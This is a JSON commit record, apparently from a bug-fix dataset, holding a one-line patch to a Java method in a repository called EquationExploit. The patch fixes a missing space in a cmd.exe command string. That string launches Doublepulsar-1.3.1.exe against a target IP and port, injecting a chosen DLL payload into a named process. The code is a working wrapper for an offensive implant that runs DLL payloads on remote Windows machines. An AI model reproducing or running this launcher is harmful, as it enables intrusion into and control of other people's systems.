{"new_feature": "20,1,1,67,1,1.00", "commitmessage": "fix bug", "patch": ["@@ -304,7 +304,7 @@ public void DPexp_function() {\n \n \n \n-                String DPexpCommand = \"C:\\\\Windows\\\\System32\\\\cmd.exe /c \"+ dir +File.separator+\"files\"+File.separator+\"Doublepulsar-1.3.1.exe --InConfig \" + dir+File.separator+\"files\"+File.separator +\"Doublepulsar-1.3.1.xml --TargetIp \" + ip + \" --TargetPort \" + port + \" --OutConfig \" + dir+File.separator+\"logs\" +File.separator+ \"DP_\" + ip + \"_\" + port + \".txt\" + \" --Protocol \" + protocol + \" --Architecture \" + architecture + \" --Function \" + function + \" --DllPayload \" +dir +File.separator+\"dlls\"+File.separator+payload +\"--payloadDllOrdinal \"+dllordinal+\" --ProcessName \"+processName+\" --ProcessCommandLine \"+processCommandLine+\" --NetworkTimeout \"+networkTimeout;\n+                String DPexpCommand = \"C:\\\\Windows\\\\System32\\\\cmd.exe /c \"+ dir +File.separator+\"files\"+File.separator+\"Doublepulsar-1.3.1.exe --InConfig \" + dir+File.separator+\"files\"+File.separator +\"Doublepulsar-1.3.1.xml --TargetIp \" + ip + \" --TargetPort \" + port + \" --OutConfig \" + dir+File.separator+\"logs\" +File.separator+ \"DP_\" + ip + \"_\" + port + \".txt\" + \" --Protocol \" + protocol + \" --Architecture \" + architecture + \" --Function \" + function + \" --DllPayload \" +dir +File.separator+\"dlls\"+File.separator+payload +\" --payloadDllOrdinal \"+dllordinal+\" --ProcessName \"+processName+\" --ProcessCommandLine \"+processCommandLine+\" --NetworkTimeout \"+networkTimeout;\n                 System.out.println(DPexpCommand);\n                 runCMD(DPexpCommand);\n             }"], "edit": ["-                String DPexpCommand = \"C:\\\\Windows\\\\System32\\\\cmd.exe /c \"+ dir +File.separator+\"files\"+File.separator+\"Doublepulsar-1.3.1.exe --InConfig \" + dir+File.separator+\"files\"+File.separator +\"Doublepulsar-1.3.1.xml --TargetIp \" + ip + \" --TargetPort \" + port + \" --OutConfig \" + dir+File.separator+\"logs\" +File.separator+ \"DP_\" + ip + \"_\" + port + \".txt\" + \" --Protocol \" + protocol + \" --Architecture \" + architecture + \" --Function \" + function + \" --DllPayload \" +dir +File.separator+\"dlls\"+File.separator+payload +\"--payloadDllOrdinal \"+dllordinal+\" --ProcessName \"+processName+\" --ProcessCommandLine \"+processCommandLine+\" --NetworkTimeout \"+networkTimeout;", "+                String DPexpCommand = \"C:\\\\Windows\\\\System32\\\\cmd.exe /c \"+ dir +File.separator+\"files\"+File.separator+\"Doublepulsar-1.3.1.exe --InConfig \" + dir+File.separator+\"files\"+File.separator +\"Doublepulsar-1.3.1.xml --TargetIp \" + ip + \" --TargetPort \" + port + \" --OutConfig \" + dir+File.separator+\"logs\" +File.separator+ \"DP_\" + ip + \"_\" + port + \".txt\" + \" --Protocol \" + protocol + \" --Architecture \" + architecture + \" --Function \" + function + \" --DllPayload \" +dir +File.separator+\"dlls\"+File.separator+payload +\" --payloadDllOrdinal \"+dllordinal+\" --ProcessName \"+processName+\" --ProcessCommandLine \"+processCommandLine+\" --NetworkTimeout \"+networkTimeout;"], "url": ["https://api.github.com/repos/1135/EquationExploit/commits/bbd6d403d756ca6668477aee447e380c83c1cc5f"]}